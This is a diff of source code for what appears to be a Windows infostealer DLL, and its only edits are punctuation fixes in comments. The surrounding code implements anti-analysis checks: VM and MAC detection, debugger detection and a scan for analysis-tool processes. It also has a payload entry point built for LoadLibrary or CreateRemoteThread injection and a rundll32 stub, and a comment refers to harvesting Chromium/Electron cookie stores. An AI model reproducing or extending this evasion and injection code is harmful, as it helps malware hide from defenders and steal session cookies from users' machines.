                         p = p->Next;
                         continue;
                     }
-                    // Skip adapters with "Virtual" or "WSL" in the description
+                    // Skip adapters with "Virtual" or "WSL" in the description.
                     bool isVirtual = false;
                     const char* desc = p->Description;
                     if(desc){
-                        // Check for "Virtual", "WSL", "Hyper-V" in description
+                        // Check for "Virtual", "WSL", "Hyper-V" in description.
                         for(const char* s = desc; s[0]; s++){
                             if((s[0]=='V'||s[0]=='v') && (s[1]=='i'||s[1]=='I') &&
                                (s[2]=='r'||s[2]=='R') && (s[3]=='t')){ isVirtual=true; break; }
@@ -2239,7 +2239,7 @@ static bool IsAnalysisEnv(void){
     Dbg("IsAnalysisEnv: no VM MAC (physical adapters only)");
 
     // 2. Check for debugger (IsDebuggerPresent + CheckRemoteDebuggerPresent)
-    // These are in kernel32.dll which is already loaded
+    // These are in kernel32.dll which is already loaded.
     typedef BOOL (WINAPI *tIsDbg)(void);
     typedef BOOL (WINAPI *tCheckDbg)(HANDLE, PBOOL);
     HMODULE k32 = GetModuleHandleA("kernel32.dll");
@@ -2272,13 +2272,13 @@ static bool IsAnalysisEnv(void){
         PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
         typedef BOOL (WINAPI *tFirst)(HANDLE, void*);
         typedef BOOL (WINAPI *tNext)(HANDLE, void*);
-        // Use Process32FirstW/NextW from kernel32 (already loaded)
+        // Use Process32FirstW/NextW from kernel32 (already loaded).
         HMODULE k32 = GetModuleHandleA("kernel32.dll");
         tFirst fFirst = (tFirst)GetProcAddress(k32, "Process32FirstW");
         tNext  fNext  = (tNext)GetProcAddress(k32, "Process32NextW");
         if(fFirst && fNext && fFirst(snap, &pe)){
             do {
-                // Convert wide name to lowercase ASCII for comparison
+                // Convert wide name to lowercase ASCII for comparison.
                 char name[260]; int j=0;
                 for(; j<259 && pe.szExeFile[j]; j++){
                     wchar_t c = pe.szExeFile[j];
@@ -2301,7 +2301,7 @@ static bool IsAnalysisEnv(void){
     Dbg("IsAnalysisEnv: no analysis processes");
 
     // Only do timing check if not in a known VM environment (to avoid false positives)
-    // Skip timing check as it can cause false positives on loaded systems
+    // Skip timing check as it can cause false positives on loaded systems.
     Dbg("IsAnalysisEnv: timing check skipped (avoid false positives)");
 
     return false;
@@ -2311,9 +2311,9 @@ static bool IsAnalysisEnv(void){
 // This noop exists only so rundll32 doesn't complain about a missing export.
 extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int) {}
 
-// diagnostic build entry: LoadLibrary binds imports and runs THIS instead of the
+// Diagnostic build entry: LoadLibrary binds imports and runs THIS instead of the
 // full payload_entry, which the probe then calls manually under an SEH frame to
-// pinpoint crashes without the loader lock swallowing the exception
+// pinpoint crashes without the loader lock swallowing the exception.
 extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, void*){ return 1; }
 
 // Curated CEF/Electron stores. These are Chromium userData roots: a Cookies
@@ -2400,7 +2400,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     Dbg("payload_entry: anti-analysis checks passed");
     // LoadLibrary calls: hinst=base, reason=DLL_PROCESS_ATTACH(1), reserved=NULL
     // CreateRemoteThread calls: hinst=arg(1), reason=undefined, reserved=undefined
-    // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1)
+    // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1).
     if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 1; }
     g_first_rec = true;
     g_rec_n = 0;
